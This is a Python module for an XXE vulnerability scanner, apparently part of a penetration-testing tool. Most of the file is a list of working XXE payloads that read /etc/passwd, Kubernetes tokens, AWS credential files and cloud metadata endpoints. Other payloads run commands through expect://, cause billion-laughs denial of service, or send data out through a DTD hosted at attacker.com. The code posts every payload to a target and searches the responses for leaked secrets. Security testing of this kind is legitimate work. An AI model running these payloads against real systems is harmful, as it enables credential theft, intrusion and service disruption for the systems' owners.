"""
XXE (XML External Entity) Scanner
Modern 2025 XXE detection techniques
"""

import logging
import re

import requests

from ..config import Config
from .base import BaseScanner

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """Detect XXE vulnerabilities"""

    def __init__(
        self, target, payload_file=None, output_file=None, dynamic_payloads=None
    ):
        super().__init__(target, output_file)
        self.payload_file = payload_file
        self.dynamic_payloads = dynamic_payloads
        self.findings = []

    def get_payloads(self):
        """Get XXE payloads - Modern 2025 techniques"""
        default_payloads = [
            # Classic XXE - File disclosure
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>""",
            # Windows file disclosure
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"> ]>
<data>&xxe;</data>""",
            # PHP wrapper for file disclosure (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&xxe;</data>""",
            # SSRF via XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<data>&xxe;</data>""",
            # AWS metadata (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&xxe;</data>""",
            # Billion laughs attack (DoS)
            """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>""",
            # Parameterized entity (Blind XXE - 2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>test</data>""",
            # Blind XXE with parameter entities
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>""",
            # XXE with data exfiltration (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
<data>test</data>""",
            # UTF-7 encoded XXE bypass (2025)
            """<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-data+AD4-+ACY-xxe+ADsAPA-/data+AD4-""",
            # Java-specific XXE (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///app.jar!/META-INF/MANIFEST.MF"> ]>
<data>&xxe;</data>""",
            # .NET-specific XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config"> ]>
<data>&xxe;</data>""",
            # XXE with expect (RCE)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id"> ]>
<data>&xxe;</data>""",
            # Data URI XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
<data>&xxe;</data>""",
            # SOAP XXE (2025 APIs)
            """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Body>
<data>&xxe;</data>
</soap:Body>
</soap:Envelope>""",
            # SVG XXE (2025 image uploads)
            """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>""",
            # Office document XXE (DOCX/XLSX)
            """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
            # XSLT XXE (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="&xxe;"/>
</xsl:template>
</xsl:stylesheet>""",
            # XInclude attack (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</data>""",
            # XXE in JSON (XML parsing backend)
            """{"data": "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\"> ]><data>&xxe;</data>"}""",
            # Kubernetes secrets via XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token"> ]>
<data>&xxe;</data>""",
            # Docker secrets
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///run/secrets/secret_name"> ]>
<data>&xxe;</data>""",
            # Cloud config files (2025)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/user/.aws/credentials"> ]>
<data>&xxe;</data>""",
            # GCP credentials
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"> ]>
<data>&xxe;</data>""",
            # Error-based XXE (forces error message with file content)
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<data>test</data>""",
        ]

        if self.dynamic_payloads:
            return self.dynamic_payloads

        # Load custom payloads if provided
        if self.payload_file:
            try:
                with open(self.payload_file, "r") as f:
                    custom_payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                    default_payloads.extend(custom_payloads)
                    logger.info(f"Loaded {len(custom_payloads)} custom XXE payloads")
            except Exception as e:
                logger.error(f"Error loading payload file: {e}")

        return default_payloads

    def detect_xxe(self, response, payload):
        """Detect XXE indicators in response"""
        indicators = []

        # Check for file disclosure patterns
        file_patterns = [
            (r"root:.*:0:0:", "/etc/passwd disclosure"),
            (r"\[boot loader\]", "Windows system.ini disclosure"),
            (r"BEGIN RSA PRIVATE KEY", "Private key disclosure"),
            (r'"accessKeyId"', "AWS credentials leak"),
            (r'"access_token"', "Access token leak"),
            (r"password\s*[:=]\s*\S+", "Password in config"),
            (r"api[_-]?key\s*[:=]\s*\S+", "API key disclosure"),
        ]

        for pattern, desc in file_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append(desc)

        # Check for internal IPs (SSRF via XXE)
        if re.search(
            r"10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2[0-9]|3[01])\.\d+\.\d+",
            response.text,
        ):
            indicators.append("Internal IP disclosure")

        # Check for metadata responses
        if re.search(
            r'"instanceId"|"ami-id"|"project-id"', response.text, re.IGNORECASE
        ):
            indicators.append("Cloud metadata leak")

        # Check for XML parsing errors (error-based XXE)
        error_patterns = [
            r"XML.*error",
            r"DOCTYPE.*not allowed",
            r"External entity",
            r"DTD.*prohibited",
        ]

        for pattern in error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                indicators.append("XML parsing error")
                break

        return indicators

    def scan(self):
        """Execute XXE scan"""
        print(
            f"\n{Config.COLOR_BLUE}[*] Starting Greaper XXE scanner on {self.target}{Config.COLOR_RESET}"
        )

        payloads = self.get_payloads()
        if not payloads:
            print(f"{Config.COLOR_RED}[-] No payloads loaded{Config.COLOR_RESET}")
            return

        print(
            f"{Config.COLOR_GREEN}[+] Loaded {len(payloads)} XXE payloads{Config.COLOR_RESET}\n"
        )

        # Test each XXE payload
        for idx, payload in enumerate(payloads, 1):
            try:
                # Send as XML content
                headers = {
                    "Content-Type": "application/xml",
                    "User-Agent": Config.USER_AGENT,
                }

                response = self.session.post(
                    self.target,
                    data=payload,
                    headers=headers,
                    timeout=Config.DEFAULT_TIMEOUT,
                    verify=False,
                    allow_redirects=True,
                )

                indicators = self.detect_xxe(response, payload)

                if indicators:
                    finding = {
                        "type": "XXE",
                        "severity": "critical",
                        "payload": payload[:100] + "..."
                        if len(payload) > 100
                        else payload,
                        "indicators": indicators,
                        "url": self.target,
                    }
                    self.findings.append(finding)

                    print(
                        f"{Config.COLOR_RED}[!] XXE vulnerability found!{Config.COLOR_RESET}"
                    )
                    print(f"    Indicators: {', '.join(indicators)}")
                    print(f"    Payload #{idx}")
                    logger.critical(f"XXE found: {indicators}")
                else:
                    print(
                        f"{Config.COLOR_BLUE}[-] No XXE for payload #{idx}{Config.COLOR_RESET}"
                    )

            except Exception as e:
                logger.error(f"Error testing XXE payload #{idx}: {e}")

        # Summary
        print(f"\n{Config.COLOR_BLUE}[*] Scan Summary:{Config.COLOR_RESET}")
        if self.findings:
            print(
                f"{Config.COLOR_RED}[!] Found {len(self.findings)} XXE vulnerabilities!{Config.COLOR_RESET}"
            )
        else:
            print(
                f"{Config.COLOR_GREEN}[-] No XXE vulnerabilities found{Config.COLOR_RESET}"
            )

        self.save_results()

    def save_results(self):
        """Save findings to file"""
        if self.output_file and self.findings:
            with open(self.output_file, "w") as f:
                f.write(f"XXE Scan Results for {self.target}\\n")
                f.write("=" * 50 + "\\n\\n")
                for finding in self.findings:
                    f.write(f"Severity: {finding['severity']}\\n")
                    f.write(f"Indicators: {', '.join(finding['indicators'])}\\n")
                    f.write(f"Payload Preview: {finding['payload']}\\n")
                    f.write("-" * 50 + "\\n")
            print(
                f"{Config.COLOR_GREEN}[+] Results saved to {self.output_file}{Config.COLOR_RESET}"
            )
